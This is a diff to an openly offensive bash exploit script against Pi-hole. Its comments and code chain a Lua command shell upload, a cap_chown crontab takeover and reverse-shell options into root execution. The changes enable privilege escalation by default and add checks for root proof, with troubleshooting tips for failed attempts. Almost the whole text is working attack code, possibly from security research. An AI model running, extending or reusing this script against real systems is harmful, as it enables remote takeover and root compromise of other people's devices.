@@ -10,9 +10,9 @@
 #
 # workaround for the civetweb patch:
 #  - stage an auth-digest file using Teleporter
-#  - point put_delete_auth_file to our staged digest 
+#  - point put_delete_auth_file to our staged digest
 #  - enable serve_all
-#  - upload our lua, authenticating with the put_delete_auth_file digest 
+#  - upload our lua, authenticating with the put_delete_auth_file digest
 #  - curl the lua cmd shell
 #  - use cap_chown to take ownership of /var/spool/cron/crontabs/root
 #  - add our script to root crontab
@@ -32,7 +32,7 @@ rshell_port=9009
 rshell_ip=""
 
 # attempt to escalate to root
-do_privesc=false
+do_privesc=true
 do_cleanup=false
 
 while (($#)); do
@@ -41,6 +41,7 @@ while (($#)); do
         --reverse-shell-ip=*)    rshell_ip=${1#*=} ;;
         --reverse-shell-port=*)  rshell_port=${1#*=} ;;
         --enable-privesc)        do_privesc=true ;;
+        --disable-privesc)       do_privesc=false ;;
         --cleanup)               do_cleanup=true ;;
         *) printf 'unknown argument: %s\n' "$1" >&2; exit 2 ;;
     esac
@@ -54,7 +55,7 @@ if [ "${rshell_enabled}" == "true" ];then
   fi
 fi
 
-do_privesc() {
+run_privesc() {
   # check for priv escalations
   echo "[*] attempting privilege escalation"
   # PUT privesc.sh
@@ -71,11 +72,43 @@ do_privesc() {
     args="rshell $rshell_ip $rshell_port"
   fi
   echo "[*] calling x.lua privilege escalation cmd=bash /etc/pihole/privesc.sh ${args}"
-  res="$( curl -Gsk "${PIHOST}/etc/pihole/x.lua" --data-urlencode "cmd=bash /etc/pihole/privesc.sh ${args}" )"
-  echo "$res" | sed 's/^/  [privesc] /g'
+  reslog="$( curl -Gsk "${PIHOST}/etc/pihole/x.lua" --url-query "cmd=bash /etc/pihole/privesc.sh ${args}" )"
+  echo "$reslog" | sed 's/^/  [privesc] /g'
+
+  if [[ "${reslog}" == *"privesc-success"* ]];then
+    echo "[+] Escalation succeeded, sleeping 10 seconds and checking for root proof";sleep 10
+    res="$( curl -sk --url-query "cmd=cat /tmp/root-exec" "${PIHOST}/etc/pihole/x.lua" | grep -ve INFO -ve ERROR )"
+    if [[ "${res}" == *"uid=0"* ]];then
+      echo "[+] success, root exec"
+      echo "${res}"
+    else
+      echo "[-] did not find uid=0 in /tmp/root-exec, did you change ROOTCMD?"
+      echo "[-] are you running a vulnerable version (<= 6.7)?"
+      echo "[-] check if /opt/pihole/pihole-FTL-poststop.sh has our script"
+      echo "[-] or check if crontab staged properly, check if cron picked up crontab refresh"
+      echo "[-] - if not then try crontab -e as pihole to change directory mtime"
+      echo "[-] - or wait 60seconds if it used the cron route"
+      echo "[-]"
+      echo "[-] try the other non-exec LPEs (gravity chown, file-disclosures, etc)"
+      exit 1
+    fi
+  else
+    echo "[-] did not receive success signal from privesc.sh"
+    echo "[*] - our pkill pihole-FTL prevents the signal being flushed"
+    echo "[*] - waiting 10s and checking for root proof anyway..";sleep 10
+    res="$( curl -sk --url-query "cmd=cat /tmp/root-exec" "${PIHOST}/etc/pihole/x.lua" | grep -ve INFO -ve ERROR )"
+    if [[ "${res}" == *"uid=0"* ]];then
+      echo "[+] success, root exec"
+      echo "${res}"
+    else
+      echo "[-] no root-exec"
+      exit 1
+    fi
+  fi
+
 }
 
-do_cleanup() {
+run_cleanup() {
   # clean-up
   echo "[*] cleaning up"
 
@@ -178,7 +211,7 @@ fi
 
 # call x.lua
 if [ "${LUACMD}x" != "x" ];then
-  res="$( curl -Gsk "${PIHOST}/etc/pihole/x.lua" --data-urlencode "cmd=${LUACMD}" )"
+  res="$( curl -Gsk "${PIHOST}/etc/pihole/x.lua" --url-query "cmd=${LUACMD}" )"
   printf "[+] called x.lua LUACMD cmd=${LUACMD}:\n%s\n" "$res"
 fi
 
@@ -195,14 +228,14 @@ printf "[+] accessed /etc/passwd:\n%s\n" "$res"
 #printf "[+] called x.lua privilege escalation cmd=bash /etc/pihole/privesc.sh:\n%s\n" "$res"
 # call privesc.sh
 if [ "${do_privesc}" == "true" ];then
-  do_privesc
+  run_privesc
 else
   echo "[-] skipping privilege escalation (use --enable-privesc to enable)"
 fi
 
 # clean-up
 if [ "${do_cleanup}" == "true" ];then
-  do_cleanup
+  run_cleanup
 else
   echo "[-] skipping cleanup (use --cleanup to enable)"
 fi
